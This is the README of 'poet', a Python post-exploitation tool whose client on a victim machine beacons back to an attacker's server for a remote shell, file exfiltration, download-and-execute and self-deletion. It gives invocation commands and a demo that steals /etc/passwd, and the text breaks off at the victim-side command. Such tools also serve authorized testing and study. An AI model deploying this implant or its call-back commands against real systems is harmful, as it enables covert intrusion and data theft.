# poet

A simple POst-Exploitation Tool.

## overview

The client program runs on the target machine and is configured with an IP
address (the server) to connect to and a frequency to connect at. If the server
isn't running when the client tries to connect, the client quietly sleeps and
tries again at the next interval. If the server is running however, the
attacker gets a control shell to control the client and perform various actions
on the target including:

- reconnaissance
- remote shell
- file exfiltration
- download and execute
- self destruct

## usage

Poet is super easy to use, and requires nothing more than the Python (2.7)
standard library. To easily try it out, a typical invocation would look like:

Terminal 1:

```
$ ./client.py -v 127.0.0.1 1
```

Terminal 2:

```
$ sudo ./server.py
```

Note: By default, the server needs to be run as root (using `sudo`) because the default
port it binds to is 443. If that makes you uncomfortable, simply use the
`-p <PORT>` flag on both the client and server and pick a nice, high number
for your port (> 1024).

Of course, using the `-h` flag gives you the full usage.

```
$ ./client.py -h
usage: client.py [-h] [-p PORT] [-v] [-d] IP INTERVAL

positional arguments:
  IP                    server
  INTERVAL              (s)

optional arguments:
  -h, --help            show this help message and exit
  -p PORT, --port PORT
  -v, --verbose
  -d, --delete          delete client upon execution

$ ./server.py -h
usage: server.py [-h] [-p PORT]

optional arguments:
  -h, --help            show this help message and exit
  -p PORT, --port PORT
```

## demo

This is just a small sample of what poet can do.

The scenario is, an attacker has gotten access to the victim's machine and
downloaded and executed the client (in verbose mode ;).  He/she does not have
the server running at this point, but it's ok, the client waits patiently.
Eventually the attacker is ready and starts the server, first starting a shell
and executing `uname -a`, then exfiltrating `/etc/passwd`. Then he/she exits
and detaches from the client, which continues running on the target waiting for
the next opportunity to connect to the server.

Victim's Machine (5.4.3.2):

```
$ ./client.py -v 1.2.3.4 10
